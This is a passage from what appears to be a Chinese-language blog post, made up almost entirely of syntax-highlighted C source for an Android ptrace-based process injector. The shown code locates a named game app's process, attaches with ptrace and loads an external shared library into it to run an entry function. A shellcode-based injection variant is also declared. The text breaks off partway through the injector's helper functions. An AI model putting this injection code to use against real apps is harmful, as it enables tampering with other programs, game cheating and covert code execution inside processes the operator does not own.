class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ptraceInject.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;utils/PrintLog.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*************************************************</span></span><br><span class="line"><span class="comment">  Description:    通过进程名称定位到进程的PID</span></span><br><span class="line"><span class="comment">  Input:          process_name为要定位的进程名称</span></span><br><span class="line"><span class="comment">  Output:         无</span></span><br><span class="line"><span class="comment">  Return:         返回定位到的进程PID，若为-1，表示定位失败</span></span><br><span class="line"><span class="comment">  Others:         无</span></span><br><span class="line"><span class="comment">*************************************************/</span> </span><br><span class="line"><span class="keyword">pid_t</span> FindPidByProcessName(<span class="keyword">const</span> <span class="keyword">char</span> *process_name)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> ProcessDirID = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">pid_t</span> pid = <span class="number">-1</span>;</span><br><span class="line">FILE *fp = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">char</span> filename[MAX_PATH] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">char</span> cmdline[MAX_PATH] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dirent</span> * <span class="title">entry</span> = <span class="title">NULL</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( process_name == <span class="literal">NULL</span> )</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">DIR* dir = opendir( <span class="string">"/proc"</span> );</span><br><span class="line"><span class="keyword">if</span> ( dir == <span class="literal">NULL</span> )</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>( (entry = readdir(dir)) != <span class="literal">NULL</span> )</span><br><span class="line">&#123;</span><br><span class="line">ProcessDirID = atoi( entry-&gt;d_name );</span><br><span class="line"><span class="keyword">if</span> ( ProcessDirID != <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">snprintf</span>(filename, MAX_PATH, <span class="string">"/proc/%d/cmdline"</span>, ProcessDirID);</span><br><span class="line">fp = fopen( filename, <span class="string">"r"</span> );</span><br><span class="line"><span class="keyword">if</span> ( fp )</span><br><span class="line">&#123;</span><br><span class="line">fgets(cmdline, <span class="keyword">sizeof</span>(cmdline), fp);</span><br><span class="line">fclose(fp);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strncmp</span>(process_name, cmdline, <span class="built_in">strlen</span>(process_name)) == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">pid = ProcessDirID;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">closedir(dir);</span><br><span class="line"><span class="keyword">return</span> pid;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line"><span class="keyword">char</span> InjectModuleName[MAX_PATH] = <span class="string">"/data/libInjectModule.so"</span>;    <span class="comment">// 注入模块全路径</span></span><br><span class="line"><span class="keyword">char</span> RemoteCallFunc[MAX_PATH] = <span class="string">"Inject_entry"</span>;              <span class="comment">// 注入模块后调用模块函数名称</span></span><br><span class="line"><span class="keyword">char</span> InjectProcessName[MAX_PATH] = <span class="string">"com.yiyou.org.mario.xyhy"</span>;                      <span class="comment">// 注入进程名称</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 当前设备环境判断</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(__i386__)  </span></span><br><span class="line">LOGD(<span class="string">"Current Environment x86"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">elif</span> defined(__arm__)</span></span><br><span class="line">LOGD(<span class="string">"Current Environment ARM"</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span>     </span></span><br><span class="line">LOGD(<span class="string">"other Environment"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">pid_t</span> pid = FindPidByProcessName(InjectProcessName);</span><br><span class="line"><span class="keyword">if</span> (pid == <span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Get Pid Failed"</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"begin inject process, RemoteProcess pid:%d, InjectModuleName:%s, RemoteCallFunc:%s\n"</span>, pid, InjectModuleName, RemoteCallFunc);</span><br><span class="line"><span class="keyword">int</span> iRet = inject_remote_process(pid,  InjectModuleName, RemoteCallFunc,  <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">//int iRet = inject_remote_process_shellcode(pid,  InjectModuleName, RemoteCallFunc,  NULL, 0);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (iRet == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Inject Success\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Inject Failed\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"end inject,%d\n"</span>, pid);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>ptraceInject.h<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/************************************************************</span></span><br><span class="line"><span class="comment">  FileName: ptraceInject.h</span></span><br><span class="line"><span class="comment">  Description:       ptrace注入      </span></span><br><span class="line"><span class="comment">***********************************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;    </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;       </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;    </span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>  MAX_PATH 0x100</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">inject_remote_process</span><span class="params">(<span class="keyword">pid_t</span> pid, <span class="keyword">char</span> *LibPath, <span class="keyword">char</span> *FunctionName, <span class="keyword">long</span> *FuncParameter, <span class="keyword">long</span> NumParameter)</span></span>;   <span class="comment">// 通过ptrace远程调用dlopen/dlsym方式注入模块到远程进程</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">inject_remote_process_shellcode</span><span class="params">(<span class="keyword">pid_t</span> pid, <span class="keyword">char</span> *LibPath, <span class="keyword">char</span> *FunctionName, <span class="keyword">long</span> *FuncParameter, <span class="keyword">long</span> NumParameter)</span></span>; <span class="comment">// 通过shellcode方式注入模块到远程进程</span></span><br></pre></td></tr></table></figure></p><p>ptraceInject.c<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/************************************************************</span></span><br><span class="line"><span class="comment">  FileName: ptraceInject.c</span></span><br><span class="line"><span class="comment">  Description:       ptrace注入      </span></span><br><span class="line"><span class="comment">***********************************************************/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;    </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;    </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/user.h&gt;    </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/ptrace.h&gt;    </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ptrace.h&gt;    </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;    </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;    </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dlfcn.h&gt;    </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dirent.h&gt;    </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;    </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;    </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;elf.h&gt;    </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;utils/PrintLog.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ptraceInject.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CPSR_T_MASK     ( 1u &lt;&lt; 5 )</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> REMOTE_ADDR( addr, local_base, remote_base ) ( (uint32_t)(addr) + (uint32_t)(remote_base) - (uint32_t)(local_base) ) </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *libc_path = <span class="string">"/system/lib/libc.so"</span>;    </span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *linker_path = <span class="string">"/system/bin/linker"</span>;   </span><br><span class="line"></span><br><span class="line"><span class="comment">/*************************************************</span></span><br><span class="line"><span class="comment">  Description:    ptrace使远程进程继续运行</span></span><br><span class="line"><span class="comment">  Input:          pid表示远程进程的ID</span></span><br><span class="line"><span class="comment">  Output:         无</span></span><br><span class="line"><span class="comment">  Return:         返回0表示continue成功，返回-1表示失败</span></span><br><span class="line"><span class="comment">  Others:         无</span></span><br><span class="line"><span class="comment">*************************************************/</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ptrace_continue</span><span class="params">(<span class="keyword">pid_t</span> pid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (ptrace(PTRACE_CONT, pid, <span class="literal">NULL</span>, <span class="literal">NULL</span>) &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">LOGD(<span class="string">"ptrace cont error, pid:%d"</span>, pid);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*************************************************</span></span><br><span class="line"><span class="comment">  Description:    使用ptrace Attach到指定进程</span></span><br><span class="line"><span class="comment">  Input:          pid表示远程进程的ID</span></span><br><span class="line"><span class="comment">  Output:         无</span></span><br><span class="line"><span class="comment">  Return:         返回0表示attach成功，返回-1表示失败</span></span><br><span class="line"><span class="comment">  Others:         无</span></span><br><span class="line"><span class="comment">*************************************************/</span>  </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ptrace_attach</span><span class="params">(<span class="keyword">pid_t</span> pid)</span>    </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> status = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ptrace(PTRACE_ATTACH, pid, <span class="literal">NULL</span>, <span class="number">0</span>) &lt; <span class="number">0</span>) &#123;    </span><br><span class="line">        LOGD(<span class="string">"attach process error, pid:%d"</span>, pid);    </span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;    </span><br><span class="line">    &#125;    </span><br><span class="line"></span><br><span class="line"> LOGD(<span class="string">"attach process pid:%d"</span>, pid);          </span><br><span class="line">    waitpid(pid, &amp;status , WUNTRACED);       </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;    </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">/*************************************************</span></span><br><span class="line"><span class="comment">  Description:    使用ptrace detach指定进程</span></span><br><span class="line"><span class="comment">  Input:          pid表示远程进程的ID</span></span><br><span class="line"><span class="comment">  Output:         无</span></span><br><span class="line"><span class="comment">  Return:         返回0表示detach成功，返回-1表示失败</span></span><br><span class="line"><span class="comment">  Others:         无</span></span><br><span class="line"><span class="comment">*************************************************/</span>    </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ptrace_detach</span><span class="params">(<span class="keyword">pid_t</span> pid)</span>    </span></span><br><span class="line"><span class="function"></span>&#123;    </span><br><span class="line">    <span class="keyword">if</span> (ptrace(PTRACE_DETACH, pid, <span class="literal">NULL</span>, <span class="number">0</span>) &lt; <span class="number">0</span>) &#123;    </span><br><span class="line">        LOGD(<span class="string">"detach process error, pid:%d"</span>, pid);     </span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;    </span><br><span class="line">    &#125;    </span><br><span class="line">    </span><br><span class="line">LOGD(<span class="string">"detach process pid:%d"</span>, pid);  </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*************************************************</span></span><br><span class="line"><span class="comment">  Description:    使用ptrace获取远程进程的寄存器值</span></span><br><span class="line"><span class="comment">  Input:          pid表示远程进程的ID，regs为pt_regs结构，存储了寄存器值</span></span><br><span class="line"><span class="comment">  Output:         无</span></span><br><span class="line"><span class="comment">  Return:         返回0表示获取寄存器成功，返回-1表示失败</span></span><br><span class="line"><span class="comment">  Others:         无</span></span><br><span class="line"><span class="comment">*************************************************/</span> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ptrace_getregs</span><span class="params">(<span class="keyword">pid_t</span> pid, struct pt_regs *regs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (ptrace(PTRACE_GETREGS, pid, <span class="literal">NULL</span>, regs) &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">LOGD(<span class="string">"Get Regs error, pid:%d"</span>, pid);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span 